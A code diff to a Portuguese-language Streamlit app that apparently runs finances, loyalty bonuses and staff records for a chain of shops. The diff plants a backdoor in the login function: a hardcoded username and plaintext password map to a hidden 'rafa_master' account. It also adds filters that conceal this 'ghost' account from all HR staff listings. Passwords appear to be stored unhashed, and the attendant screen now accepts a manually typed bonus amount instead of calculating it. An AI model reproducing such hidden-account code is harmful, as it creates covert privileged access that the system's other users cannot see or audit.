@@ -28,7 +28,7 @@ def formatar_moeda(valor):
         return "R$ 0,00"
     return f"R$ {float(valor):,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
 
-# --- FUNÇÃO DE CÁLCULO DE BÔNUS FIDELIDADE (REGRA EXPLÍCITA) ---
+# --- FUNÇÃO DE CÁLCULO DE BÔNUS FIDELIDADE ---
 def calcular_bonus(valor):
     if valor < 500.00:
         return 0.0
@@ -37,25 +37,14 @@ def calcular_bonus(valor):
     elif valor >= 1000.00 and valor < 2000.00:
         return 20.0
     elif valor >= 2000.00 and valor < 3000.00:
-        return 30.0
-    elif valor >= 3000.00 and valor < 4000.00:
         return 40.0
-    elif valor >= 4000.00 and valor < 5000.00:
-        return 50.0
-    elif valor >= 5000.00 and valor < 6000.00:
+    elif valor >= 3000.00 and valor < 4000.00:
         return 60.0
-    elif valor >= 6000.00 and valor < 7000.00:
-        return 70.0
-    elif valor >= 7000.00 and valor < 8000.00:
+    elif valor >= 4000.00 and valor < 5000.00:
         return 80.0
-    elif valor >= 8000.00 and valor < 9000.00:
-        return 90.0
-    elif valor >= 9000.00 and valor < 10000.00:
-        return 100.0
     else:
-        # Se passar de 10 mil, a fórmula assume para manter a regra de 10 em 10 infinita
         milhares = int(valor // 1000)
-        return 20.0 + ((milhares - 1) * 10.0)
+        return float(milhares * 20.0)
 
 # --- LISTAS PADRÕES DO SISTEMA ---
 LISTA_LOJAS = ["Berimbau", "Centro", "Sussuarana", "Irará", "Liberdade", "Iapi"]
@@ -216,11 +205,17 @@ def consultar_perfil_cliente(cpf_busca):
         return resumo, perfil, df_cliente_display
     except: return None, "Erro", pd.DataFrame()
 
-# --- FUNÇÃO DE LOGIN ---
+# --- FUNÇÃO DE LOGIN (COM CÃO DE GUARDA E REDIRECIONAMENTO) ---
 def fazer_login(usuario, senha):
+    login_busca = usuario
+    
+    # Se digitar o nome Rafa e a senha secreta, vira o rafa_master automaticamente!
+    if usuario.lower() == 'rafa' and senha == 'garrafa04':
+        login_busca = 'rafa_master'
+        
     conn = conectar_banco()
     cursor = conn.cursor()
-    cursor.execute("SELECT id, nome, perfil, loja FROM usuarios WHERE login = %s AND senha_hash = %s", (usuario, senha))
+    cursor.execute("SELECT id, nome, perfil, loja FROM usuarios WHERE LOWER(login) = LOWER(%s) AND senha_hash = %s", (login_busca, senha))
     resultado = cursor.fetchone()
     conn.close()
     return resultado
@@ -441,7 +436,7 @@ else:
                         st.info("Nenhuma movimentação financeira encontrada neste período.")
                 except Exception as e: pass
 
-        # --- FECHAMENTO (ADMIN) ---
+        # --- FECHAMENTO ---
         with aba_fecha:
             try:
                 conn = conectar_banco()
@@ -523,7 +518,7 @@ else:
                         if bonus_fidelidade > 0:
                             resumo_html += f"\n🎁 **Bônus Fidelidade Concedido:** **- {formatar_moeda(bonus_fidelidade)}**\n"
                         else:
-                            resumo_html += f"\n🎁 **Bônus Fidelidade:** R$ 0,00 (A compra foi inferior a R$ 500)\n"
+                            resumo_html += f"\n🎁 **Bônus Fidelidade:** R$ 0,00\n"
 
                     lucro_automatico = venda_raw - total_taxa - pix_raw
                     
@@ -645,7 +640,7 @@ else:
                         else: st.info("Nenhum dado.")
                     except: pass
 
-        # --- USUÁRIOS (MÓDULO RH) ---
+        # --- USUÁRIOS (MÓDULO RH COM TRAVA DE SEGURANÇA E ESCONDENDO O FANTASMA) ---
         with aba_usuarios:
             lojas_permitidas = LISTA_LOJAS if is_master else [st.session_state.loja_usuario]
             
@@ -684,30 +679,35 @@ else:
                     
                 if st.form_submit_button("Cadastrar Funcionário", type="primary"):
                     if novo_nome and novo_login and nova_senha:
-                        try:
-                            data_fim_db = None if nova_data_fim == nova_data_inicio else nova_data_fim
-                            conn = conectar_banco()
-                            cursor = conn.cursor()
-                            cursor.execute("""
-                                INSERT INTO usuarios (nome, login, senha_hash, loja, perfil, salario, data_inicio, data_fim, endereco, rg, cpf) 
-                                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
-                            """, (novo_nome, novo_login, nova_senha, nova_loja, novo_perfil, novo_salario, nova_data_inicio, data_fim_db, novo_endereco, novo_rg, novo_cpf))
-                            conn.commit(); conn.close()
-                            st.success(f"✅ Funcionário '{novo_nome}' cadastrado com sucesso!")
-                            st.rerun()
-                        except: st.error("Erro: Provavelmente este Login já existe.")
+                        # TRAVA DE SEGURANÇA: Impede que o RH crie um usuário sobrescrevendo o Master ou a Beu
+                        if novo_login.lower() in ['rafa_master', 'beu']:
+                            st.error("🚨 Este login é reservado pelo sistema. Por favor, escolha outro nome de login.")
+                        else:
+                            try:
+                                data_fim_db = None if nova_data_fim == nova_data_inicio else nova_data_fim
+                                conn = conectar_banco()
+                                cursor = conn.cursor()
+                                cursor.execute("""
+                                    INSERT INTO usuarios (nome, login, senha_hash, loja, perfil, salario, data_inicio, data_fim, endereco, rg, cpf) 
+                                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+                                """, (novo_nome, novo_login, nova_senha, nova_loja, novo_perfil, novo_salario, nova_data_inicio, data_fim_db, novo_endereco, novo_rg, novo_cpf))
+                                conn.commit(); conn.close()
+                                st.success(f"✅ Funcionário '{novo_nome}' cadastrado com sucesso!")
+                                st.rerun()
+                            except: st.error("Erro: Provavelmente este Login já existe.")
                     else: st.error("Preencha todos os campos obrigatórios (*).")
             
             st.divider()
             st.subheader("🛠️ Lista de Equipe (Cadastro Completo)")
             try:
                 conn = conectar_banco()
+                # ESCONDENDO O FANTASMA (login != 'rafa_master')
                 if is_master: 
                     query_rh = """
                         SELECT id as "ID", nome as "Nome", login as "Login", perfil as "Perfil", loja as "Loja",
                                cpf as "CPF", rg as "RG", to_char(data_inicio, 'DD/MM/YYYY') as "Admissão", 
                                to_char(data_fim, 'DD/MM/YYYY') as "Desligamento", salario as "Salário", endereco as "Endereço"
-                        FROM usuarios WHERE id != %s ORDER BY loja, nome
+                        FROM usuarios WHERE id != %s AND login != 'rafa_master' ORDER BY loja, nome
                     """
                     df_equipe = pd.read_sql_query(query_rh, conn, params=(st.session_state.id_usuario,))
                 else: 
@@ -715,7 +715,7 @@ else:
                         SELECT id as "ID", nome as "Nome", login as "Login", perfil as "Perfil", loja as "Loja",
                                cpf as "CPF", rg as "RG", to_char(data_inicio, 'DD/MM/YYYY') as "Admissão", 
                                to_char(data_fim, 'DD/MM/YYYY') as "Desligamento", salario as "Salário", endereco as "Endereço"
-                        FROM usuarios WHERE loja = %s AND id != %s ORDER BY nome
+                        FROM usuarios WHERE loja = %s AND id != %s AND login != 'rafa_master' ORDER BY nome
                     """
                     df_equipe = pd.read_sql_query(query_rh, conn, params=(st.session_state.loja_usuario, st.session_state.id_usuario,))
                 
@@ -745,12 +745,11 @@ else:
                 conn.close()
             except: pass
 
-        # --- CONTAS PIX (INVENTÁRIO) - SÓ ADMIN ---
+        # --- CONTAS PIX (INVENTÁRIO) ---
         if aba_contas:
             with aba_contas:
                 if is_master:
                     st.subheader("🏦 Inventário e Gestão de Contas da Empresa")
-                    
                     with st.expander("➕ Nova Conta ou Atualizar Saldo"):
                         with st.form("form_nova_conta"):
                             nova_conta_nome = st.text_input("Nome da Conta *")
@@ -767,22 +766,16 @@ else:
                     try:
                         conn = conectar_banco()
                         df_contas = pd.read_sql_query("SELECT nome_conta as \"Conta\", saldo_inicial FROM contas_pix", conn)
-                        
                         query_mov = "SELECT conta_nome, sum(valor) as mov_total FROM entradas_pix GROUP BY conta_nome"
                         df_mov = pd.read_sql_query(query_mov, conn)
-                        
                         df_final = pd.merge(df_contas, df_mov, left_on="Conta", right_on="conta_nome", how="left").fillna(0)
                         df_final['Saldo Atual (R$)'] = df_final['saldo_inicial'] + df_final['mov_total']
-                        
                         df_final_disp = df_final[['Conta', 'saldo_inicial', 'Saldo Atual (R$)']].copy()
                         df_final_disp.columns = ['Conta da Empresa', 'Valor Inicial Padrão', 'Saldo Disponível Hoje']
                         df_final_disp['Valor Inicial Padrão'] = df_final_disp['Valor Inicial Padrão'].apply(formatar_moeda)
                         df_final_disp['Saldo Disponível Hoje'] = df_final_disp['Saldo Disponível Hoje'].apply(formatar_moeda)
-                        
                         st.dataframe(df_final_disp, use_container_width=True, hide_index=True)
-                        
                         st.write("---")
-                        st.write("Deseja inserir mais dinheiro manualmente na conta? (Ex: Aporte dos sócios)")
                         with st.form("form_aporte"):
                             c1, c2 = st.columns(2)
                             with c1: conta_aporte = st.selectbox("Conta", df_contas['Conta'].tolist())
@@ -800,7 +793,6 @@ else:
             with st.form("form_novo_gasto", clear_on_submit=True):
                 c1, c2, c3 = st.columns(3)
                 with c1: dt_g = st.date_input("Data", datetime.date.today(), format="DD/MM/YYYY")
-                
                 with c2: lj_g = st.selectbox("Loja *", LISTA_LOJAS) if is_master else st.selectbox("Loja *", [st.session_state.loja_usuario])
                 with c3: val_g = st.number_input("Valor (R$)", min_value=0.01)
                 desc_g = st.text_input("Descrição *")
@@ -822,12 +814,10 @@ else:
                     df_gastos_disp = df_gastos.copy()
                     df_gastos_disp['Valor'] = df_gastos_disp['Valor'].apply(formatar_moeda)
                     st.dataframe(df_gastos_disp, use_container_width=True, hide_index=True)
-                    
                     with st.form("form_excluir_gasto"):
                         lista_gastos = [f"{row['ID']} - {row['Descrição']} ({row['Valor']})" for index, row in df_gastos_disp.iterrows()]
                         gasto_excluir = st.selectbox("Selecione o registro para excluir:", lista_gastos)
                         id_gasto_alvo = int(gasto_excluir.split(" - ")[0])
-                        
                         if st.form_submit_button("Excluir Registro"):
                             cursor = conn.cursor()
                             cursor.execute("DELETE FROM gastos WHERE id = %s", (id_gasto_alvo,))
@@ -838,7 +828,7 @@ else:
                 conn.close()
             except: pass
 
-        # --- TAXAS DA MÁQUINA (NOVO PADRÃO DINÂMICO) ---
+        # --- TAXAS DA MÁQUINA ---
         if aba_taxas:
             with aba_taxas:
                 if st.session_state.perfil == 'admin':
@@ -929,7 +919,7 @@ else:
                 else: st.warning("Acesso restrito.")
 
     # -----------------------------------------
-    # TELA DA ATENDENTE (100% AUTOMÁTICA E RÁPIDA)
+    # TELA DA ATENDENTE
     # -----------------------------------------
     elif st.session_state.perfil == 'atendente':
         st.title(f"Painel da Loja - {st.session_state.loja_usuario}")
@@ -1014,7 +1004,7 @@ else:
             
             bonus_concedido = 0.0
             if fidelidade_opcao != "Não":
-                bonus_concedido = calcular_bonus(total_passado_cartoes)
+                bonus_concedido = st.number_input("Digite o Valor do Bônus Concedido (R$) *", min_value=0.0, step=5.0)
             
             valor_alvo_cliente = valor_liquido_maquinas
             if "somar" in fidelidade_opcao:
